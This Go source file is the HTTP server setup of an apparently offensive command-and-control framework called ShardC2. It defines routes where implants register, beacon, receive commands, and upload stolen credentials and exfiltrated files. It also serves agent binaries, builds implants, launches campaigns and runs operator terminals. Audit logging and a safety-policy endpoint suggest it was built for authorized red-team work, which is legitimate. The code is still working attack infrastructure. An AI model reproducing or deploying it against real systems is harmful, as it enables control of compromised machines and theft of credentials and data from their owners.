package server

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/subtle"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"math/big"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/fiber/v2/middleware/limiter"
	"github.com/gofiber/fiber/v2/middleware/logger"
	"github.com/gofiber/fiber/v2/middleware/recover"
	"github.com/gofiber/websocket/v2"
	"github.com/shardc2/shardc2/internal/database"
	"github.com/shardc2/shardc2/internal/server/audit"
	"github.com/shardc2/shardc2/internal/server/builds"
	"github.com/shardc2/shardc2/internal/server/engine"
	"github.com/shardc2/shardc2/internal/server/handlers"
	"github.com/shardc2/shardc2/internal/server/middleware"
	"github.com/shardc2/shardc2/internal/server/report"
	"github.com/shardc2/shardc2/pkg/policy"
	"github.com/shardc2/shardc2/pkg/profiles"
)

type ServerConfig struct {
	OperatorToken  string
	BootstrapToken string
	ImplantKey     string
	PayloadKey     []byte
	C2URL          string
	Profile        *profiles.Profile
	JWTSecret      []byte

	LoginRateLimitMax    int
	LoginRateLimitWindow time.Duration
	Policy               policy.Policy
}

type Server struct {
	app    *fiber.App
	db     *database.DB
	config ServerConfig
	logger *Logger
	engine *engine.Engine
}

func New(db *database.DB, cfg ServerConfig) *Server {
	app := fiber.New(fiber.Config{
		ServerHeader:          "",
		DisableStartupMessage: true,
		AppName:               "ShardC2",
		BodyLimit:             50 * 1024 * 1024,
	})

	app.Use(recover.New())
	app.Use(logger.New(logger.Config{
		Format: "${time} | ${status} | ${latency} | ${ip} | ${method} ${path}\n",
	}))

	s := &Server{app: app, db: db, config: cfg, logger: NewLogger(os.Stdout, "INFO"), engine: engine.NewWithPolicy(db, cfg.C2URL, cfg.ImplantKey, cfg.Policy)}
	s.setupRoutes()

	app.Static("/dashboard", "./web/dashboard")
	app.Get("/favicon.ico", func(c *fiber.Ctx) error {
		return c.SendStatus(204)
	})
	app.Get("/", func(c *fiber.Ctx) error {
		return c.Redirect("/dashboard/")
	})

	go s.engine.Start(context.Background())

	return s
}

func (s *Server) setupRoutes() {
	api := s.app.Group("/api/v1")

	api.Get("/health", func(c *fiber.Ctx) error {
		return c.JSON(fiber.Map{"status": "ok", "service": "shardc2"})
	})

	wsHub := handlers.NewWSHub()

	botHandler := handlers.NewBotHandler(s.db)
	cmdHandler := handlers.NewCommandHandler(s.db, wsHub)
	credHandler := handlers.NewCredentialHandler(s.db)
	campHandler := handlers.NewCampaignHandler(s.db, s.config.Policy)
	exfilHandler := handlers.NewExfilHandler(s.db)
	opHandler := handlers.NewOperatorHandler(s.db, s.config.JWTSecret)
	auditRecorder := audit.NewRecorder(s.db)

	// Operator routes — accept legacy bearer token OR JWT
	opAuth := func(c *fiber.Ctx) error {
		auth := c.Get("Authorization")
		bootstrapToken := s.config.BootstrapToken
		if bootstrapToken == "" {
			bootstrapToken = s.config.OperatorToken
		}
		if strings.HasPrefix(auth, "Bearer ") && bootstrapToken != "" {
			token := auth[7:]
			if subtle.ConstantTimeCompare([]byte(token), []byte(bootstrapToken)) == 1 {
				if c.Method() != http.MethodPost || c.Path() != "/api/v1/operators" {
					return c.Status(403).JSON(fiber.Map{"error": "bootstrap token may only create the initial admin"})
				}
				activeAdmin, err := s.hasActiveAdmin()
				if err != nil {
					return c.Status(500).JSON(fiber.Map{"error": "failed to check bootstrap state"})
				}
				if activeAdmin {
					return c.Status(401).JSON(fiber.Map{"error": "bootstrap token disabled"})
				}
				c.Locals("operator_username", "bootstrap")
				c.Locals("operator_role", "admin")
				return c.Next()
			}
		}
		return middleware.JWTAuth(s.config.JWTSecret)(c)
	}
	auditedOpAuth := func(c *fiber.Ctx) error {
		if err := opAuth(c); err != nil {
			_ = auditRecorder.Record(c, audit.Event{
				Action:     "auth.denied",
				ObjectType: "operator_route",
				ObjectID:   c.Path(),
				Outcome:    audit.OutcomeDenied,
				Details: audit.SanitizeDetails(fiber.Map{
					"method": c.Method(),
					"path":   c.Path(),
				}),
			})
			return err
		}
		if c.Response().StatusCode() >= 400 {
			_ = auditRecorder.Record(c, audit.Event{
				Action:     "auth.denied",
				ObjectType: "operator_route",
				ObjectID:   c.Path(),
				Outcome:    audit.OutcomeDenied,
				Details: audit.SanitizeDetails(fiber.Map{
					"method": c.Method(),
					"path":   c.Path(),
				}),
			})
		}
		return nil
	}
	auditAction := func(action string, objectType string) fiber.Handler {
		return func(c *fiber.Ctx) error {
			err := c.Next()
			status := c.Response().StatusCode()
			outcome := audit.OutcomeSuccess
			if err != nil || status >= 400 {
				outcome = audit.OutcomeFailure
			}
			objectID := c.Params("id")
			if objectID == "" {
				objectID = c.Params("bot_id")
			}
			_ = auditRecorder.Record(c, audit.Event{
				Action:     action,
				ObjectType: objectType,
				ObjectID:   objectID,
				Outcome:    outcome,
				Details: audit.SanitizeDetails(fiber.Map{
					"method": c.Method(),
					"path":   c.Path(),
					"status": status,
				}),
			})
			return err
		}
	}

	// Agent routes using malleable profile paths
	implantMW := middleware.ImplantAuth(s.config.ImplantKey)
	agentMW := middleware.AgentAuth(s.db)
	payloadMW := middleware.PayloadCrypto(s.config.PayloadKey)
	agentLimiter := limiter.New(limiter.Config{Max: 60, Expiration: time.Minute})

	p := s.config.Profile
	if p == nil {
		p = profiles.Default()
	}

	binaryAuth := func(c *fiber.Ctx) error {
		if c.Get("X-Implant-Key") != "" {
			return implantMW(c)
		}
		return auditedOpAuth(c)
	}
	api.Get("/agent/binary", binaryAuth, auditAction("agent_binary.download", "agent_binary"), func(c *fiber.Ctx) error {
		arch := c.Query("arch", "arm64")
		if arch == "amd64" || arch == "x86_64" {
			return c.SendFile("./bin/shardc2-agent-amd64", false)
		}
		return c.SendFile("./bin/shardc2-agent", false)
	})

	s.app.Post(p.ServerPath("register"), payloadMW, implantMW, botHandler.Register)
	s.app.Post(p.ServerPath("beacon"), payloadMW, agentMW, agentLimiter, botHandler.AgentBeacon)
	s.app.Get(p.ServerPath("commands"), payloadMW, agentMW, agentLimiter, cmdHandler.AgentGetPending)
	s.app.Post(p.ServerPath("result"), payloadMW, agentMW, agentLimiter, cmdHandler.SubmitResult)
	s.app.Post(p.ServerPath("credentials"), payloadMW, agentMW, agentLimiter, credHandler.Submit)
	s.app.Post(p.ServerPath("exfil"), payloadMW, agentMW, agentLimiter, exfilHandler.Upload)
	s.app.Post(p.ServerPath("refresh_token"), payloadMW, agentMW, botHandler.RefreshToken)

	// WebSocket route (auth via query param)
	api.Use("/ws", handlers.WSUpgradeCheck())
	api.Get("/ws/terminal", func(c *fiber.Ctx) error {
		token := c.Query("token")
		if token == "" {
			return c.Status(401).JSON(fiber.Map{"error": "unauthorized"})
		}
		c.Request().Header.Set("Authorization", "Bearer "+token)
		return middleware.JWTAuth(s.config.JWTSecret)(c)
	}, websocket.New(handlers.WSHandler(wsHub)))

	// Operator auth & login routes
	loginLimitMax := s.config.LoginRateLimitMax
	if loginLimitMax == 0 {
		loginLimitMax = 5
	}
	loginLimitWindow := s.config.LoginRateLimitWindow
	if loginLimitWindow == 0 {
		loginLimitWindow = time.Minute
	}
	api.Post("/auth/login", limiter.New(limiter.Config{Max: loginLimitMax, Expiration: loginLimitWindow}), opHandler.Login)

	op := api.Group("", auditedOpAuth)
	op.Use(limiter.New(limiter.Config{Max: 600, Expiration: time.Minute}))

	bots := op.Group("/bots")
	bots.Get("/", botHandler.List)
	bots.Get("/:id", botHandler.Get)
	bots.Delete("/:id", botHandler.Remove)

	cmds := op.Group("/commands")
	cmds.Post("/", auditAction("command.create", "command"), cmdHandler.Create)
	cmds.Post("/batch", auditAction("command.batch_create", "command"), cmdHandler.BatchCreate)
	cmds.Get("/history/:bot_id", cmdHandler.History)

	creds := op.Group("/credentials")
	creds.Post("/", credHandler.Submit)
	creds.Get("/", auditAction("credential.list", "credential"), credHandler.List)
	creds.Get("/:id/reveal", auditAction("credential.reveal", "credential"), credHandler.Reveal)
	creds.Delete("/:id", auditAction("credential.delete", "credential"), credHandler.Delete)

	camps := op.Group("/campaigns")
	camps.Post("/", auditAction("campaign.create", "campaign"), campHandler.Create)
	camps.Get("/", campHandler.List)
	camps.Get("/:id", campHandler.Get)
	camps.Put("/:id", campHandler.Update)
	camps.Delete("/:id", auditAction("campaign.delete", "campaign"), campHandler.Delete)
	camps.Post("/:id/bots", campHandler.AssignBots)
	camps.Delete("/:id/bots/:bot_id", campHandler.RemoveBot)
	camps.Get("/:id/bots", campHandler.ListBots)
	camps.Post("/:id/launch", auditAction("campaign.launch", "campaign"), campHandler.Launch)
	camps.Get("/:id/progress", campHandler.Progress)
	camps.Get("/:id/results", campHandler.Results)
	camps.Post("/:id/replay", auditAction("campaign.replay", "campaign"), campHandler.Replay)
	camps.Post("/validate", campHandler.Validate)

	exfil := op.Group("/exfil")
	exfil.Get("/", auditAction("exfil.list", "exfil"), exfilHandler.List)
	exfil.Get("/:id", auditAction("exfil.download", "exfil"), exfilHandler.Download)
	exfil.Delete("/:id", auditAction("exfil.delete", "exfil"), exfilHandler.Delete)

	op.Get("/stats", botHandler.Stats)

	statusHandler := handlers.NewStatusHandler(s.db, s.config.Policy)
	op.Get("/safety/status", statusHandler.SafetyStatus)

	camps.Get("/:id/report.md", func(c *fiber.Ctx) error {
		campID := c.Params("id")
		md, err := report.GenerateCampaignReport(s.db, campID)
		if err != nil {
			return c.Status(404).JSON(fiber.Map{"error": err.Error()})
		}
		c.Set("Content-Type", "text/markdown; charset=utf-8")
		c.Set("Content-Disposition", "attachment; filename=campaign-report.md")
		return c.SendString(md)
	})

	pluginHandler := handlers.NewPluginHandler("plugins")
	op.Get("/plugins", pluginHandler.List)

	buildHandler := handlers.NewBuildHandler(s.db, builds.NewLocalBuilder("."))
	blds := op.Group("/builds")
	blds.Post("/", auditAction("build.create", "build"), buildHandler.Create)
	blds.Get("/:id", buildHandler.Get)
	blds.Get("/:id/download", auditAction("build.download", "build"), buildHandler.Download)

	// Admin-only operator management
	opAdmin := op.Group("/operators", func(c *fiber.Ctx) error {
		role, _ := c.Locals("operator_role").(string)
		if role != "admin" {
			return c.Status(403).JSON(fiber.Map{"error": "admin access required"})
		}
		return c.Next()
	})
	opAdmin.Post("/", auditAction("operator.create", "operator"), opHandler.Register)
	opAdmin.Get("/", opHandler.List)
	opAdmin.Delete("/:id", auditAction("operator.delete", "operator"), opHandler.Deactivate)
}

func (s *Server) hasActiveAdmin() (bool, error) {
	if s.db == nil {
		return false, nil
	}
	var exists bool
	err := s.db.QueryRow(`SELECT EXISTS(SELECT 1 FROM operators WHERE role = 'admin' AND active = true)`).Scan(&exists)
	return exists, err
}

func (s *Server) Start(addr string) error {
	fmt.Printf("[*] C2 Server listening on %s\n", addr)
	return s.app.Listen(addr)
}

func (s *Server) StartTLS(addr, certFile, keyFile string) error {
	fmt.Printf("[*] C2 Server listening on %s (TLS)\n", addr)
	return s.app.ListenTLS(addr, certFile, keyFile)
}

func (s *Server) Shutdown() error {
	return s.app.Shutdown()
}

func GenerateSelfSignedCert(certPath, keyPath string) error {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return fmt.Errorf("generate key: %w", err)
	}

	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	tmpl := x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{Organization: []string{"ShardC2"}},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &tmpl, &tmpl, &key.PublicKey, key)
	if err != nil {
		return fmt.Errorf("create certificate: %w", err)
	}

	cf, err := os.Create(certPath)
	if err != nil {
		return fmt.Errorf("create cert file: %w", err)
	}
	defer cf.Close()
	pem.Encode(cf, &pem.Block{Type: "CERTIFICATE", Bytes: certDER})

	keyDER, err := x509.MarshalECPrivateKey(key)
	if err != nil {
		return fmt.Errorf("marshal key: %w", err)
	}
	kf, err := os.OpenFile(keyPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		return fmt.Errorf("create key file: %w", err)
	}
	defer kf.Close()
	pem.Encode(kf, &pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

	return nil
}
